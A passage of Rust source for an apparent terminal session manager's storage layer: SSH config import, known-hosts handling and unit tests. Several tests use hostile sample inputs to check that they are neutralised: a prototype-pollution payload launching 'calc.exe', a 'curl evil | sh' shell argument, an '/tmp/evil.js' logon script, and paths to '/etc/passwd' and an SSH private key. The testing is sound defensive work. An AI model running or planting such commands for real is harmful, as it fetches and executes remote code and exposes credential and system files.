                    hosts.push((json!({ "name": pat, "protocol": "ssh2", "host": pat, "port": 22, "username": "", "auth": {}, "ssh": {} }), String::new()));
                    cur = Some(hosts.len() - 1);
                }
            } else if key == "match" {
                cur = None;
            } else if let Some(i) = cur {
                let (h, jump) = &mut hosts[i];
                let yes = val.to_lowercase().contains("yes");
                match key.as_str() {
                    "hostname" => h["host"] = json!(val),
                    "port" => h["port"] = json!(val.parse::<f64>().map(|p| p as u64).unwrap_or(0)),
                    "user" => h["username"] = json!(val),
                    "identityfile" => h["auth"]["keyFile"] = json!(crate::util::expand_tilde(&val)),
                    "forwardagent" => h["ssh"]["agentForward"] = json!(yes),
                    "compression" => h["ssh"]["compression"] = json!(yes),
                    "serveraliveinterval" => h["ssh"]["keepAlive"] = json!(val.parse::<f64>().unwrap_or(0.0) as u64),
                    "proxyjump" => *jump = val.split(',').next().unwrap_or("").to_string(),
                    _ => {}
                }
            }
        }
        if hosts.is_empty() {
            return Ok(0);
        }
        let folder = self.save_folder(&json!({ "name": "SSH Config", "parent": "" }))?;
        let mut saved = std::collections::HashMap::new();
        for (h, _) in &hosts {
            let mut h = h.clone();
            h["parent"] = folder["id"].clone();
            let s = self.save_session(&h)?;
            saved.insert(string(&h["name"]), s["id"].clone());
        }
        let strip = regex::Regex::new(r"^.*@|:\d+$").unwrap();
        for (h, jump) in &hosts {
            if jump.is_empty() {
                continue;
            }
            if let Some(jid) = saved.get(strip.replace_all(jump, "").as_ref()).cloned() {
                let id = string(&saved[&string(&h["name"])]);
                let s = self.session_mut(&id).unwrap();
                obj_mut(s, "ssh").insert("jumpSessionId".into(), jid);
            }
        }
        self.write("sessions")?;
        Ok(hosts.len())
    }

    // ---- known hosts ---------------------------------------------------
    pub fn known_host(&self, host_port: &str) -> Option<&Value> {
        self.known_hosts.get(host_port)
    }

    pub fn set_known_host(&mut self, host_port: &str, info: &Value) -> Result<()> {
        let mut v = info.clone();
        v["added"] = json!(chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Millis, true));
        self.known_hosts[host_port] = v;
        self.write("knownHosts")
    }

    pub fn known_hosts(&self) -> &Value {
        &self.known_hosts
    }

    pub fn delete_known_host(&mut self, host_port: &str) -> Result<()> {
        if let Some(m) = self.known_hosts.as_object_mut() {
            m.remove(host_port);
        }
        self.write("knownHosts")
    }
}

#[cfg(test)]
pub mod tests {
    use super::*;
    use crate::safe_storage::TestBox;

    pub fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("termcraft-{tag}-{}", new_id("")));
        fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn secrets_hidden_from_tree_and_kept_on_update() {
        let mut store = Store::new(&tmp("store"), None).unwrap();
        let saved = store.save_session(&json!({ "name": "a", "protocol": "ssh2", "host": "h", "auth": { "password": "pw" } })).unwrap();
        assert_eq!(saved["auth"]["hasPassword"], true);
        assert!(saved["auth"].get("password").is_none());
        assert!(!store.tree().to_string().contains("\"pw\""));
        let mut again = saved.clone();
        again["name"] = json!("b");
        store.save_session(&again).unwrap(); // password absent -> kept
        let id = saved["id"].clone();
        assert_eq!(store.resolve_session(&id).unwrap()["auth"]["password"], "pw");
        assert_eq!(store.resolve_session(&id).unwrap()["terminal"]["scrollback"], 10000); // defaults merged
        let mut cleared = saved.clone();
        cleared["auth"] = json!({ "password": "" });
        store.save_session(&cleared).unwrap();
        assert_eq!(store.resolve_session(&id).unwrap()["auth"]["password"], "");
    }

    #[test]
    fn keychain_encryption_is_used_when_available() {
        let mut store = Store::new(&tmp("enc"), Some(Arc::new(TestBox([7; 16])))).unwrap();
        let saved = store.save_session(&json!({ "name": "a", "host": "h", "auth": { "password": "pw" } })).unwrap();
        let raw = fs::read_to_string(&store.sessions_file).unwrap();
        assert!(raw.contains("\"enc:"));
        assert!(!raw.contains("\"pw\""));
        assert_eq!(store.resolve_session(&saved["id"]).unwrap()["auth"]["password"], "pw");
        assert_eq!(store.check_keychain(), "ok");
    }

    #[test]
    fn folder_delete_cascades() {
        let mut store = Store::new(&tmp("fold"), None).unwrap();
        let f1 = store.save_folder(&json!({ "name": "f1", "parent": "" })).unwrap();
        let f2 = store.save_folder(&json!({ "name": "f2", "parent": f1["id"] })).unwrap();
        store.save_session(&json!({ "name": "s", "host": "h", "parent": f2["id"] })).unwrap();
        store.save_session(&json!({ "name": "keep", "host": "h", "parent": "" })).unwrap();
        store.delete_folder(&string(&f1["id"])).unwrap();
        let t = store.tree();
        assert_eq!(t["folders"].as_array().unwrap().len(), 0);
        assert_eq!(t["sessions"].as_array().unwrap().iter().map(|s| s["name"].clone()).collect::<Vec<_>>(), vec![json!("keep")]);
    }

    #[test]
    fn ssh_config_import_with_proxy_jump() {
        let dir = tmp("sshcfg");
        let cfg = dir.join("config");
        fs::write(
            &cfg,
            "Host bastion\n  HostName 1.2.3.4\n  User ops\nHost db\n  HostName 10.0.0.5\n  Port 2222\n  ProxyJump bastion\nHost *\n  ServerAliveInterval 30\n",
        )
        .unwrap();
        let mut store = Store::new(&dir, None).unwrap();
        assert_eq!(store.import_ssh_config(Some(&cfg)).unwrap(), 2);
        let db = store.find_session_by_name("db").unwrap().clone();
        let bastion = store.find_session_by_name("bastion").unwrap().clone();
        assert_eq!(db["port"], 2222);
        assert_eq!(db["ssh"]["jumpSessionId"], bastion["id"]);
        assert_eq!(bastion["username"], "ops");
    }

    #[test]
    fn old_theme_settings_and_sessions_migrate() {
        let dir = tmp("theme");
        fs::write(dir.join("settings.json"), r#"{"theme":"light","defaultSession":{"terminal":{"colorScheme":"TermCraft Dark"}}}"#).unwrap();
        fs::write(dir.join("sessions.json"), r#"{"folders":[],"sessions":[{"id":"a","name":"a","terminal":{"colorScheme":"TermCraft Dark"}},{"id":"b","name":"b","terminal":{"colorScheme":"Monokai"}}]}"#).unwrap();
        let store = Store::new(&dir, None).unwrap();
        assert_eq!(store.settings()["theme"], "TermCraft Light");
        assert_eq!(store.settings()["defaultSession"]["terminal"]["colorScheme"], "");
        assert_eq!(store.session("a").unwrap()["terminal"]["colorScheme"], "", "old default now follows the theme");
        assert_eq!(store.session("b").unwrap()["terminal"]["colorScheme"], "Monokai", "explicit choices are kept");
    }

    #[test]
    fn flat_buttons_migrate_to_default_bar() {
        let dir = tmp("migrate");
        fs::write(dir.join("settings.json"), r#"{"buttons":[{"label":"mine","action":"send","value":"x"}]}"#).unwrap();
        let s = Store::new(&dir, None).unwrap().settings().clone();
        assert!(s.get("buttons").is_none());
        assert_eq!(s["buttonBars"][0], json!({ "id": "default", "name": "Default", "buttons": [{ "label": "mine", "action": "send", "value": "x" }] }));
        assert!(s["buttonBars"].as_array().unwrap().len() > 1);
        assert_eq!(s["activeButtonBar"], "default");
    }

    #[test]
    fn hostile_settings_cannot_pollute() {
        let dir = tmp("proto");
        fs::write(dir.join("settings.json"), r#"{"__proto__": {"polluted": true}, "constructor": {"prototype": {"polluted2": true}}, "theme": "light"}"#)
            .unwrap();
        let mut store = Store::new(&dir, None).unwrap();
        store.save_settings(&serde_json::from_str(r#"{"__proto__": {"rdpClient": "calc.exe"}}"#).unwrap()).unwrap();
        assert_eq!(store.settings()["rdpClient"], "");
        assert!(store.settings().get("__proto__").is_none());
        assert_eq!(store.settings()["theme"], "TermCraft Light");
    }

    #[test]
    fn session_import_removes_code_running_fields() {
        let mut store = Store::new(&tmp("import"), None).unwrap();
        let r = store
            .import_sessions(
                &json!({ "sessions": [
                    { "name": "innocent", "protocol": "ssh2", "host": "a", "logonScript": "/tmp/evil.js" },
                    { "name": "shell", "protocol": "local", "local": { "shell": "/bin/sh", "args": "-c \"curl evil | sh\"" } },
                    { "name": "plain", "protocol": "ssh2", "host": "b" }
                ]}),
                "Imported",
            )
            .unwrap();
        assert_eq!(r, json!({ "count": 3, "cleared": 2 }));
        // Reticulum: an imported rnsh session loses its identity file path; tool tabs are dropped.
        let r = store
            .import_sessions(
                &json!({ "sessions": [
                    { "name": "rns-node", "protocol": "rnsh", "host": "b72e9a9afb54b7d19d1930f81e7674a4", "reticulum": { "identity": "/home/x/.ssh/id_rsa" } },
                    { "name": "tool", "protocol": "rntool", "rntool": { "tool": "send", "file": "/etc/passwd" } }
                ]}),
                "Imported",
            )
            .unwrap();
        assert_eq!(r, json!({ "count": 1, "cleared": 1 }));
        let node = arr(&store.tree()["sessions"]).iter().find(|s| s["name"] == "rns-node").unwrap().clone();
        assert_eq!(node["reticulum"]["identity"], "");
        for s in arr(&store.tree()["sessions"]) {
            assert!(!truthy(&s["logonScript"]));
            assert!(!truthy(at(s, &["local", "shell"])) && !truthy(at(s, &["local", "args"])));
        }
    }

    #[cfg(unix)]
    #[test]
    fn private_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tmp("perm").join("data");
        let mut store = Store::new(&dir, None).unwrap();
        assert_eq!(fs::metadata(&dir).unwrap().permissions().mode() & 0o777, 0o700);
        store.save_session(&json!({ "name": "s", "protocol": "ssh2", "host": "h" })).unwrap();
        assert_eq!(fs::metadata(&store.sessions_file).unwrap().permissions().mode() & 0o777, 0o600);
    }

    #[test]
    fn shared_credentials_supply_login_and_take_saved_passwords() {
        let mut store = Store::new(&tmp("cred"), None).unwrap();
        let c = store.save_credential(&json!({ "name": "TACACS", "username": "ops", "password": "old" })).unwrap();
        assert_eq!(c["hasPassword"], true);
        let s = store.save_session(&json!({ "name": "r1", "host": "h", "username": "local", "auth": { "credentialId": c["id"] } })).unwrap();
        let r = store.resolve_session(&s["id"]).unwrap();
        assert_eq!(r["username"], "ops");
        assert_eq!(r["auth"]["password"], "old");
        assert_eq!(store.tree()["credentials"][0]["usedBy"], 1);
        store.save_credentials(&s["id"], &json!({ "password": "new" })).unwrap();
        assert_eq!(store.resolve_session(&s["id"]).unwrap()["auth"]["password"], "new");
        store.delete_credential(&string(&c["id"])).unwrap();
        assert_eq!(store.resolve_session(&s["id"]).unwrap()["username"], "local");
    }

    #[test]
    fn export_import_keeps_credential_links_and_only_exports_secrets_when_asked() {
        let mut store = Store::new(&tmp("exp"), None).unwrap();
        let cred = store.save_credential(&json!({ "name": "Lab", "username": "admin", "password": "pw" })).unwrap();
        store.save_session(&json!({ "name": "r1", "protocol": "ssh2", "host": "r1", "auth": { "credentialId": cred["id"] } })).unwrap();
        assert_eq!(store.export_sessions(false)["credentials"][0]["password"], "");
        let mut other = Store::new(&tmp("imp"), None).unwrap();
        other.import_sessions(&store.export_sessions(true), "Imported").unwrap();
        let s = arr(&other.tree()["sessions"]).iter().find(|x| x["name"] == "r1").unwrap().clone();
        assert_eq!(other.resolve_session(&s["id"]).unwrap()["auth"]["password"], "pw");
        assert_ne!(s["auth"]["credentialId"], cred["id"], "imported credentials get new ids");
    }

    #[test]
    fn host_import_csv_with_folders_credentials_and_jump_hosts() {
        let mut store = Store::new(&tmp("hosts"), None).unwrap();
        store.save_credential(&json!({ "name": "TACACS", "username": "netops", "password": "x" })).unwrap();
        let rns = crate::host_import::parse_hosts("name,host,protocol\nmesh-gw,<b72e9a9afb54b7d19d1930f81e7674a4>,rnsh\nbad,10.0.0.1,rnsh", &json!({}));
        assert_eq!(rns["rows"][0]["host"], "b72e9a9afb54b7d19d1930f81e7674a4");
        assert_eq!(rns["rows"][0]["port"], 0);
        assert_eq!(arr(&rns["errors"]).len(), 1, "an IP is not a destination hash");
        let parsed = crate::host_import::parse_hosts(
            "name,host,folder,protocol,credential,jump\nbastion,bastion.example.net,Sites/HQ,ssh,TACACS,\nsw1,10.0.0.1,Sites/HQ,telnet,TACACS,\nsw2,10.0.0.2,Sites/Branch,ssh,nope,bastion\n,!!bad,,,,",
            &json!({}),
        );
        assert_eq!(arr(&parsed["rows"]).len(), 3);
        assert_eq!(arr(&parsed["errors"]).len(), 1);
        let r = store.import_hosts(&parsed["rows"], &json!({})).unwrap();
        assert_eq!(r["created"], 3);
        assert_eq!(r["warnings"], json!(["sw2: no credential named \"nope\""]));
        let tree = store.tree();
        let find = |k: &str, n: &str| arr(&tree[k]).iter().find(|x| x["name"] == n).unwrap().clone();
        assert_eq!(find("folders", "HQ")["parent"], find("folders", "Sites")["id"]);
        let sw1 = find("sessions", "sw1");
        assert_eq!(sw1["parent"], find("folders", "HQ")["id"]);
        assert_eq!(sw1["port"], 23);
        assert_eq!(store.resolve_session(&sw1["id"]).unwrap()["username"], "netops");
        assert_eq!(find("sessions", "sw2")["ssh"]["jumpSessionId"], find("sessions", "bastion")["id"]);
        // Importing again skips existing hosts.
        assert_eq!(store.import_hosts(&parsed["rows"], &json!({})).unwrap()["created"], 0);
        assert_eq!(arr(&store.tree()["folders"]).iter().filter(|f| f["name"] == "HQ").count(), 1);
    }

    #[test]
    fn quick_connect_login_becomes_saved_session() {
        let mut store = Store::new(&tmp("qc"), None).unwrap();
        let saved = store.save_credentials(&json!({ "protocol": "ssh2", "host": "box", "port": 22 }), &json!({ "username": "me", "password": "pw" })).unwrap();
        assert_eq!(saved["name"], "me@box");
        assert_eq!(store.resolve_session(&saved["id"]).unwrap()["auth"]["password"], "pw");
    }
}
